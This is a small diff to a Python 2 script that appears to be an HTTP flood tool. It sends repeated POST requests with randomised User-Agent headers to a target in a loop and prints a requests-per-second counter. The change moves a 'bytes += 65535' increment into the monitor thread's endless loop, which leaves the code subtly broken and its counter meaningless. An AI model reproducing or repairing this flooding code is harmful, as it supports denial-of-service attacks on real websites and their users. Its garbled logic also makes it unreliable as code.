@@ -89,7 +89,7 @@ def httpcall(url):
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Host',host)
 	request.get_method = lambda: "POST"
-	bytes += 65535
+	bytes = 65535
 	try:
 		for i in range(bytes):
 			urllib2.urlopen(request)
@@ -126,6 +126,7 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while True:
+			bytes += 65535
 
 			print "Rps: %d" % bytes
 
